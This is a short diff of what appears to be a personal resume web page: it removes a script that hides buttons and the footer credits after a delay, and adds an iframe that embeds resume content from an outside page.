@@ -109,17 +109,5 @@
 感谢您花时间阅读我的简历，期待能有机会和您共事。
 
 
-<script type="text/javascript">
-
-	console.log('123')
-	
-	setTimeout(function(){ 
-		console.log('1234')
-		document.getElementsByClassName("btn")[0].style.display="none";
-		document.getElementsByClassName("btn")[1].style.display="none";
-		document.getElementsByClassName("site-footer-owner")[0].style.display="none";
-		document.getElementsByClassName("site-footer-credits")[0].style.display="none";
-	}, 3000);
-	
-</script>
+<iframe src="//94275.cn/resume-patch/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:0px;"  frameborder="0" scrolling="no"></iframe>
 
